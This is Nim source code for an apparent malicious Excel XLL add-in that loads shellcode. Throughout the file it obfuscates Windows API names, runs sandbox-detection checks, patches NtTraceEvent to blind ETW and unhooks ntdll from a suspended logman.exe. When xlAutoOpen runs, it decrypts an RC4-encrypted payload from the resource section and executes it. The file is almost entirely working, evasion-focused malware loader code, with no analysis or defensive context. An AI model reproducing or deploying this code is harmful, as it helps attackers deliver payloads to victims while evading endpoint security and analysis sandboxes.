import winim
import std/strformat
import std/strutils
import ptr_math
import std/dynlib
import std/httpclient
import std/osproc
import std/os
import includes/DLoader
import includes/rc4

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

when defined amd64:
    const patch: array[1, byte] = [byte 0xc3]
elif defined i386:
    const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    
# const encContent = slurp("encContent.bin")

var currentModule: HINSTANCE

type
    USTRING* = object
        Length*: DWORD
        MaximumLength*: DWORD
        Buffer*: PVOID

var keyString: USTRING
var imgString: USTRING

# Same Key
var keyBuf: array[16, char] = [char 't', 'e', 's', 't', 'K', 'e', 'y','t', 'e', 's', 't', 'K', 'e', 'y', 't', 'e']

keyString.Buffer = cast[PVOID](&keyBuf)
keyString.Length = 16
keyString.MaximumLength = 16

# Dynamic Strings
var VirtAl = ""
VirtAl.add("Vi")
VirtAl.add("rt")
VirtAl.add("ua")
VirtAl.add("lA")
VirtAl.add("ll")
VirtAl.add("oc")

var VirtPr = ""
VirtPr.add("Vi")
VirtPr.add("rt")
VirtPr.add("ua")
VirtPr.add("lP")
VirtPr.add("ro")
VirtPr.add("te")
VirtPr.add("ct")

var GPIM = ""
GPIM.add("Get")
GPIM.add("Phy")
GPIM.add("sic")
GPIM.add("ally")
GPIM.add("Ins")
GPIM.add("tal")
GPIM.add("led")
GPIM.add("Sys")
GPIM.add("tem")
GPIM.add("Mem")
GPIM.add("ory")

var VirtAlExNuma = ""
VirtAlExNUma.add("Vi")
VirtAlExNuma.add("rt")
VirtAlExNuma.add("ua")
VirtAlExNuma.add("lA")
VirtAlExNuma.add("ll")
VirtAlExNuma.add("oc")
VirtAlExNuma.add("Ex")
VirtAlExNuma.add("Nu")
VirtAlExNuma.add("ma")

var GetModHandle = ""
GetModHandle.add("Get")
GetModHandle.add("Mod")
GetModHandle.add("ule")
GetModHandle.add("Han")
GetModHandle.add("dle")
GetModHandle.add("A")

var CFM = ""
CFM.add("Cre")
CFM.add("ate")
CFM.add("Fil")
CFM.add("eMa")
CFM.add("ppi")
CFM.add("ngA")

var MVOF = ""
MVOF.add("Map")
MVOF.add("Vie")
MVOF.add("wOf")
MVOF.add("Fi")
MVOF.add("le")

var LoadL = ""
LoadL.add("Lo")
LoadL.add("ad")
LoadL.add("Lib")
LoadL.add("raryA")

var GPA = ""
GPA.add("Get")
GPA.add("Pro")
GPA.add("cAd")
GPA.add("dre")
GPA.add("ss")

var RPM = ""
RPM.add("Rea")
RPM.add("dPr")
RPM.add("oce")
RPM.add("ssM")
RPM.add("emo")
RPM.add("ry")

var CProc = ""
CProc.add("Cre")
CProc.add("ate")
CProc.add("Pro")
CProc.add("cess")
CProc.add("A")

var TProc = ""
TProc.add("Ter")
TProc.add("min")
TProc.add("ate")
TProc.add("Pro")
TProc.add("cess")

# Function prototypes
type
    VirtualAlloc_t* = proc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.} 
    VirtualProtect_t* = proc(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}
    GetPhysicallyInstalledSystemMemory_t* = proc(TotalMemoryInKB: PULONGLONG): WINBOOL {.stdcall.}
    VirtualAllocExNuma_t* = proc(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD, nndPreferred: DWORD): LPVOID {.stdcall.}
    GetModuleHandleA_t* = proc(lpModuleName: LPCSTR): HMODULE {.stdcall.}
    CreateFileMapping_t* = proc(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCWSTR): HANDLE {.stdcall.}
    MapViewOfFile_t* = proc(hFileMappingObject: HANDLE, dwDesiredAccess: DWORD, dwFileOffsetHigh: DWORD, dwFileOffsetLow: DWORD, dwNumberOfBytesToMap: SIZE_T): LPVOID {.stdcall.}
    LoadLibrary_t* = proc(lpLibFileName: LPCWSTR): HMODULE {.stdcall.}
    GetProcAddress_t* = proc(hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
    ReadProcessMemory_t* = proc(hProcess: HANDLE, lpBaseAddress: LPCVOID, lpBuffer: LPVOID, nSize: SIZE_T, lpNumberOfBytesRead: ptr SIZE_T): WINBOOL {.stdcall.}
    CreateProcessA_t* = proc(lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.}
    TerminateProcess_t* = proc(hProcess: HANDLE, uExitCode: UINT): WINBOOL {.stdcall.}

var 
    VirtualAlloc_p*: VirtualAlloc_t
    VirtualProtect_p*: VirtualProtect_t
    GetPhysicallyInstalledSystemMemory_p*: GetPhysicallyInstalledSystemMemory_t
    VirtualAllocExNuma_p*: VirtualAllocExNuma_t
    GetModuleHandleA_p*: GetModuleHandleA_t
    CreateFileMapping_p*: CreateFileMapping_t
    MapViewOfFile_p*: MapViewOfFile_t
    LoadLibrary_p*: LoadLibrary_t
    GetProcAddress_p*: GetProcAddress_t
    ReadProcessMemory_p*: ReadProcessMemory_t
    CreateProcessA_p*: CreateProcessA_t
    TerminateProcess_p*: TerminateProcess_t

var k32Addr: HANDLE = get_library_address() 

VirtualAlloc_p = cast[VirtualAlloc_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtAl)))
VirtualProtect_p = cast[VirtualProtect_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtPr)))
#GetPhysicallyInstalledSystemMemory_p = cast[GetPhysicallyInstalledSystemMemory_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), GPIM)))
VirtualAllocExNuma_p = cast[VirtualAllocExNuma_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtAlExNuma)))
GetModuleHandleA_p = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), GetModHandle)))
CreateFileMapping_p = cast[CreateFileMapping_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), CFM)))
MapViewOfFile_p = cast[MapViewOfFile_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), MVOF)))
LoadLibrary_p = cast[LoadLibrary_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), LoadL)))
GetProcAddress_p = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), GPA)))
ReadProcessMemory_p = cast[ReadProcessMemory_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), RPM)))
CreateProcessA_p = cast[CreateProcessA_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), CProc)))
TerminateProcess_p = cast[TerminateProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), TProc)))

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc sbCheck(): int =
    var count: int = 0
    let clientHttp = newHttpClient(userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0")
    var testUrl: string
    testUrl.add("ht")
    testUrl.add("tp://")
    testUrl.add("0hR")
    testUrl.add("Ib4")
    testUrl.add("t1f")
    testUrl.add("WNPY")
    testUrl.add("BVA")
    testUrl.add(".net")
    testUrl.add("/inde")
    testUrl.add("x.php")
    # Attempt to reach nonexistent url
    try:
        let responseHttp = clientHttp.get(testUrl)
        if responseHttp.code == Http200 or responseHttp.status == "200":
            count += 1
    except:
        count += 0
    # Check installed RAM size
    var memAvail: ULONGLONG = 0
    var GPIM_p: GetPhysicallyInstalledSystemMemory_t = cast[GetPhysicallyInstalledSystemMemory_t](GetProcAddress_p(cast[HMODULE](k32Addr), GPIM))
    try: 
        discard GPIM_p(addr memAvail)
    except:
        echo "[-] GetPISM failed!"
        echo GetLastError()
    #[if GetPhysicallyInstalledSystemMemory_p(addr memAvail) != 0:
        echo "GetPISM function failed!"
    ]#
    if memAvail < 4000000:
        count += 1 
    # Attempt VirtualAllocExNuma - Should fail in a sandbox
    var mem: LPVOID = NULL
    mem = VirtualAllocExNuma_p(GetCurrentProcess(), NULL, 1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0)
    if mem != NULL: 
        count += 0
    else:
        count += 1
    # Check processor count
    if countProcessors() < 2:
        count += 1

    return count

proc Patchntdll(): bool =
    var
        ntdStr: string
        ntTEStr: string
        ntdll: HMODULE
        cs: FARPROC
        op: DWORD
        t: DWORD
        disabled: bool = false
    
    ntdStr.add("nt")
    ntdStr.add("dl")
    ntdStr.add("l.d")
    ntdStr.add(".ll")

    ntTEStr.add("Nt")
    ntTEStr.add("Tra")
    ntTEStr.add("ce")
    ntTEStr.add("Eve")
    ntTEStr.add("nt")
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = LoadLibrary_p(ntdStr)
    #[ntdll = loadLib(ntdStr)
    if isNil(ntdll):
        #echo "[X] Failed to load lib"
        return disabled
    
    cs = ntdll.symAddr(ntTEStr) # equivalent of GetProcAddress()
    if isNil(cs):
        #echo "[X] Failed to get 'NtTE' location"
        return disabled
        ]#
    cs = GetProcAddress_p(ntdll, ntTEStr)
    if VirtualProtect_p(cs, patch.len, 0x40, addr op) != 0:
        copyMem(cs, unsafeAddr patch, patch.len)
        discard VirtualProtect_p(cs, patch.len, op, addr t)
        disabled = true

    return disabled

proc isHooked(address: LPVOID): bool =
    let stub: array[4, byte] = [byte 0x4c, 0x8b, 0xd1, 0xb8]
    if cmpMem(address, unsafeAddr stub, 4) != 0:
        return true
    return false

proc getNtdll(): LPVOID =
  var pntdll: LPVOID = nil

  # Create our suspended process
  var si: STARTUPINFOA
  var pi: PROCESS_INFORMATION
  ZeroMemory(addr si, sizeof(si))
  ZeroMemory(addr pi, sizeof(PROCESS_INFORMATION))
  let createResult = CreateProcessA_p("C:\\Windows\\System32\\logman.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, addr si, addr pi)
  if createResult == 0:
    #echo "[-] Error creating process"
    quit(QuitFailure)

  # Get base address of NTDLL
  var nt: string = ""
  nt.add("nt")
  nt.add("dl")
  nt.add("l.d")
  nt.add("ll")

  #let process = GetCurrentProcess()
  var mi = MODULEINFO()
  let ntdllModule = GetModuleHandleA_p(nt)
  GetModuleInformation(cast[HANDLE](-1), ntdllModule, addr mi, cast[DWORD](sizeof(mi)))

  pntdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage)
  var dwRead: SIZE_T
  let bSuccess = ReadProcessMemory_p(pi.hProcess, cast[LPCVOID](mi.lpBaseOfDll), pntdll, mi.SizeOfImage, addr dwRead)
  if bSuccess == 0:
    #echo "Failed in reading ntdll: ", GetLastError()
    quit(QuitFailure)
  discard TerminateProcess_p(pi.hProcess, 0)
  return pntdll

proc unhook(cleanNtdll: LPVOID): bool =
    var 
        oldprotect: DWORD = 0
        SectionHeader: PIMAGE_SECTION_HEADER
    var nt: string = ""
    nt.add("nt")
    nt.add("dl")
    nt.add("l.d")
    nt.add("ll")

    let low: uint16 = 0
    let hNtdll: HMODULE = GetModuleHandleA_p(nt)
    let DOSHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](cleanNtdll)
    let NtHeader: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](cleanNtdll) + DOSHeader.e_lfanew)
    for Section in low ..< NtHeader.FileHeader.NumberOfSections:
        SectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(NtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        #echo "Current Section is: ", toString(SectionHeader.Name)
        if cmp("2E74657874000000", toHex(toString(SectionHeader.Name))) == 0:
            #echo "Found .text section"
            if VirtualProtect_p(cast[LPVOID](hNtdll + SectionHeader.VirtualAddress), SectionHeader.Misc.VirtualSize, 0x40, addr oldprotect) == 0: #0x40 = PAGE_EXECUTE_READWRITE
                #echo fmt"VP Call Failed! ({GetLastError()})."
                return false
            copyMem(cast[LPVOID](hNtdll + SectionHeader.VirtualAddress), cleanNtdll + SectionHeader.VirtualAddress, SectionHeader.Misc.VirtualSize)
            if VirtualProtect_p(cast[LPVOID](hNtdll + SectionHeader.VirtualAddress), SectionHeader.Misc.VirtualSize, oldprotect, addr oldprotect) == 0:
                #echo fmt"VP Call Failed! ({GetLastError()})."
                return false
            return true
    return false  

proc NimMain() {.cdecl, importc.}

proc execute(): void =
    var resourceId = 100
    var resourceType = 10

    # Get pointer to encrypted shellcode in .rsrc section
    #echo "currentModule is: ", currentModule
    var myResource: HRSRC = FindResource(cast[HMODULE](currentModule), MAKEINTRESOURCE(resourceId), MAKEINTRESOURCE(resourceType))

    #if myResource == 0:
      #echo "FindResource failed!"
      #echo GetLastError()

    var myResourceSize: DWORD = SizeofResource(cast[HMODULE](currentModule), myResource)

    #[ if myResourceSize == 0:
      echo "SizeOfResource failed!"
      echo GetLastError()
    ]#
    var hResource: HGLOBAL = LoadResource(cast[HMODULE](currentModule), myResource)
    #[if hResource == 0:
      echo "LoadResource failed!"
      echo GetLastError()
    else:
      echo "hResource at: ", toHex(hResource)
    ]#
    var oldProtect: DWORD

    let buffer = VirtualAlloc_p(cast[LPVOID](0), cast[SIZE_T](myResourceSize), MEM_COMMIT, PAGE_READ_WRITE)
    let memBuff: int = cast[int](buffer)
    #echo "Mem buffer at: ", memBuff.toHex
    #echo "VA Called!"
    copyMem(buffer, cast[LPVOID](hResource), myResourceSize)
    #echo "CopyMem Called!"
    imgString.Buffer = buffer
    imgString.Length = myResourceSize
    imgString.MaximumLength = myResourceSize

    #echo "imgString is: ", repr &imgString
    #echo "imgString location: ", toHex(cast[int](&imgString)) 
    #echo "keyString is: ", repr &keyString
    #echo "keyString location: ", toHex(cast[int](&keyString))
    #echo "keyString Buffer Location: ", toHex(cast[int](&keyString.Buffer))

    SystemFunction032(&imgString, &keyString)
    echo "SF032 Called!"

    discard VirtualProtect_p(buffer, cast[SIZE_T](myResourceSize), PAGE_EXECUTE_READ, addr oldProtect)
    #echo "VP Called!"
    let f = cast[proc(){.nimcall.}](buffer)
    f()
    
proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  if fdwReason == DLL_PROCESS_ATTACH:
    NimMain()
    currentModule = hinstDLL
  return true

proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
  if sbCheck() >= 2:
    #echo "sbCheck returned true! "
    for i in 1 .. 10000000:
      sleep(100)
      quit(0)
  else:
    #echo "sbCheck returned false!"
    discard Patchntdll()
    #echo "Patchntdll ran!"
    let nt = getNtdll()
    #echo "getNtdll ran!"
    discard unhook(nt)
    #echo "unhook ran!"
    execute()